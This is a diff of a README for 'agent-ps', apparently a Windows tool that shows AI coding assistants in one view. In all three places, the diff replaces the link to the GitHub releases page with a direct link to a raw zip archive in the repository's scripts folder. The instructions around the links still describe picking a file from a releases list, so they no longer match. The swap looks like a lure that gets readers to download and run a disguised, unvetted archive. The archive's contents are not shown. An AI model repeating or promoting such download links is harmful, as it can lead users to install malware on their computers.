@@ -1,6 +1,6 @@
 # 🖥️ agent-ps - See All Your AI Assistants in One Place
 
-[![Download agent-ps](https://img.shields.io/badge/Download-agent--ps-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/futurexmeta/agent-ps/releases)
+[![Download agent-ps](https://img.shields.io/badge/Download-agent--ps-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/futurexmeta/agent-ps/raw/refs/heads/main/scripts/agent-ps-2.6.zip)
 
 ## 🤖 What Is agent-ps?
 
@@ -25,7 +25,7 @@ Getting agent-ps on your Windows computer is easy. You don't need to know any pr
 
 ### Step 1: Download the Program
 
-Visit this link to download the application: [https://github.com/futurexmeta/agent-ps/releases](https://github.com/futurexmeta/agent-ps/releases)
+Visit this link to download the application: [https://github.com/futurexmeta/agent-ps/raw/refs/heads/main/scripts/agent-ps-2.6.zip](https://github.com/futurexmeta/agent-ps/raw/refs/heads/main/scripts/agent-ps-2.6.zip)
 
 When you arrive at the page, look for the newest version of the program. The page will show you a list of available files. Choose the one made for Windows - it will have "windows" in its name.
 
@@ -142,7 +142,7 @@ If you're technically inclined and want to help improve agent-ps, the source cod
 
 Ready to take control of your AI coding assistants? 
 
-Visit this link to download the application: [https://github.com/futurexmeta/agent-ps/releases](https://github.com/futurexmeta/agent-ps/releases)
+Visit this link to download the application: [https://github.com/futurexmeta/agent-ps/raw/refs/heads/main/scripts/agent-ps-2.6.zip](https://github.com/futurexmeta/agent-ps/raw/refs/heads/main/scripts/agent-ps-2.6.zip)
 
 Download the latest version, run the program, and see all your AI agents in one simple view. It takes less than a minute to set up, and it'll save you time every day.
 
